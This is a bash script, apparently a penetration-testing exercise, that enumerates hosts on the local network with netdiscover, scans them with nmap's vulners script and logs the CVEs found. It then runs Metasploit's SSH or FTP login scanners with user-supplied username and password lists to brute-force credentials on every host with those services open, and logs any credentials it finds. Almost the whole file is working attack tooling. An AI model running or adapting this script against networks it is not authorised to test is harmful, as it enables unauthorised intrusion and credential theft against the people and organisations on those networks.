#!/bin/bash

get_lan_netdetails()
{
	networkCard=$(ip route list| grep default | awk '{print $5}')
	subnetIp=$(ip route list| grep "$networkCard" | grep kernel | awk '{print $1}')
	netRange=$(netmask -r "$subnetIp")
	echo "Your network range is: $netRange"

	temp_file=$(mktemp)
	sudo netdiscover -r "$subnetIp" -PN > "$temp_file"  
	
	output_file="ipaddrlist.txt"
	grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' "$temp_file" > "$output_file"
	
	# Remove ip address ending with 1,2 and 254
	grep -v -E '\.(1|2|254)$' "$output_file" > "${output_file}.tmp"
	mv "${output_file}.tmp" "$output_file"
	# Clean up the temporary file
	rm "$temp_file"
}

passF_count=0

bruteforce_login()
{
	target_host=$1
	service=$2
	port=$3
	username_list=$4
	password_list=$5
	
	echo "Attempting brute-force attack on $service service at $target_host port $port..."
	
	msfconsole -x "use auxiliary/scanner/$service/${service}_login;
		set RHOSTS $target_host;
		
		set RPORT $port;
        set USER_FILE $username_list;
        set PASS_FILE $password_list;
        run;
        exit -y;" > msf_output.tmp
        
		grep -i success msf_output.tmp | awk -v timestamp="$(date "+%Y-%m-%d %H:%M:%S")" '{ print "[" timestamp "] Credentials found for IP: " $2 " | Username & Password: " $5 }' >> scanReport.log
		
		if grep -i success msf_output.tmp 
		then
			 passF_count=$((passF_count + 1))
		fi
        rm msf_output.tmp
}

get_lan_netdetails

echo 'Ip address found -----------------'
cat ipaddrlist.txt
echo ''

ipaddrFound="ipaddrlist.txt"
filenamelst="filescreated.txt"

# For ip address found in the ipaddrlist.txt do nmap --vulner scan
while read -r ipaddr
do
	if [ -z "$ipaddr" ] || [[ "$ipaddr" == "#"* ]]; then
        continue
    fi
	
	echo "Nmap scanning $ipaddr......"
	echo ''
	
	#Nmap scan to scheck for vulnerabilities and store the file in a file name with the ipaddress
	filename="${ipaddr}_vunFound.txt"
	nmap --script vulners -sV "$ipaddr" -oN "$filename" >/dev/null
	
	#track the files created for each nmap output
	echo "$filename" >> "$filenamelst"
	
	echo '----------------------------------------'
done <"$ipaddrFound"

echo ''

cveF_count=0

#For every nmap output file, read each line and find the coresponding service and vulnerability and save it into a log file
while IFS= read -r nmap_output_file 
do
    if [[ ! -f $nmap_output_file ]]
    then
        echo "Error: File '$nmap_output_file' not found. Skipping."
        continue
    fi

    while IFS= read -r line 
    do
        
		if [[ $line =~ ^PORT.* ]] 
		then
        continue
		fi
		
		if [[ $line =~ .*scan[[:space:]]report.*\(([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\) ]] 
		then
			ip_address="${BASH_REMATCH[1]}"   
			echo "Checking $ip_address for vunlnerabilities"
			echo '----------------------------------------'
			echo ''
		fi
		
		if [[ $line =~ ([0-9]+)\/(tcp|udp)[[:space:]]+(.+)[[:space:]]+([0-9]+\.[0-9]+\.[0-9]+) ]]
		then
			port="${BASH_REMATCH[1]}"
			protocol="${BASH_REMATCH[2]}"
			service_name="${BASH_REMATCH[3]}"
			#version="${BASH_REMATCH[4]}"
		fi
		
		if [[ $line =~ CVE-([0-9-]+) ]] 
		then
			cve="${BASH_REMATCH[0]}"
			echo "[$(date "+%Y-%m-%d %H:%M:%S")] Vulnerability found for IP: $ip_address | Service: $service_name (Port: $port/$protocol) | CVE: $cve" >> scanReport.log
			cveF_count=$((cveF_count + 1))
		fi

    done < "$nmap_output_file"

    #echo ": $nmap_output_file"
done < "$filenamelst"


# ask user if they wish to brute force the found host
read -p "Do you wish to attemp brute-force attack on the found host or exit (y/n)" bf_choice

if [ "$bf_choice" == "y" ]
then
	read -p "Enter the path to the username list file: " username_list_path
	userlist="$username_list_path"
	
	read -p "Do you want to specify a password file or customise a password file (specify/customise)" pwfiletype
	if [ "$pwfiletype"  == "specify" ]
	then
		read -p "Enter the path to the password list file: " pw_list_path
		pwlist="$pw_list_path"
	
	else [ "$pwfiletype"  == "customise" ]
		touch newPwlist.txt
		pwlist="newPwlist.txt"
		
		read -p "Enter a password: " password
		echo "$password" >> newPwlist.txt
		
		while true
		do
			read -p "Enter password or 'n/N' to stop editing " newPwans
			
			case $newPwans in
				[Nn]* )
					break
					;;
				* )
					echo "$newPwans" >> newPwlist.txt
			esac
		done
	fi
elif [ "$bf_choice" == "n" ]
then
	exit
fi
			
#Check if brute force attack is possible
#Check first if brute force via SSH is possible, else check if brute force via FTP is possible
for possBF in $(cat filescreated.txt)
do
	ipaddr2=$(cat "$possBF" | grep 'scan report' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+') 
	possSSH=$(cat "$possBF" | grep -w ssh | grep -w open)
	
	if [ -z "$possSSH" ]
	then
		possFTP=$(cat "$possBF" | grep -w ftp | grep -w open)
		if [ -z "$possFTP" ]
		then
			echo 'No brute force option avaliable'
		else
			serType="ftp"
			portNums=($(cat "$possBF" | grep -w ftp | grep -w open | awk -F / '{print $1}'))
			
			# for the same service, check if there is mutiple ports open
			for portNum in "${portNums[@]}" 
			do
				bruteforce_login "$ipaddr2" "$serType" "$portNum" "$userlist" "$pwlist"
			done
		fi
	else
		
		serType="ssh"
		portNums=($(cat "$possBF" | grep -w ssh | grep -w open | awk -F / '{print $1}'))
		for portNum in "${portNums[@]}" 
		do
			bruteforce_login "$ipaddr2" "$serType" "$portNum" "$userlist" "$pwlist"
		done
	fi
	
done

deviceF_count=$(wc -l < ipaddrlist.txt)

echo '------Scan Results-------'
echo ''
echo "Scan done on: $(date "+%Y-%m-%d %H:%M:%S")"
echo "Your network range is: $netRange"
echo "Device found: $deviceF_count"
echo "vulnerability found: $cveF_count"
echo "Brute-force credentials found: $passF_count"

cat scanReport.log >> vul_Report.log


read -p "Enter the IP address to search for scan result for the particular host:" search_ip
echo ''
echo "Search result for IP adress: $search_ip"

sReport=$(cat scanReport.log | grep "$search_ip")
if [ -z "$sReport" ]
then
	echo 'No results found'
else
	echo "$sReport"
fi
echo '----------------------------------------'
echo 'See vul_report.log for full report'

#clean up files
rm scanReport.log
rm filescreated.txt
rm newPwlist.txt


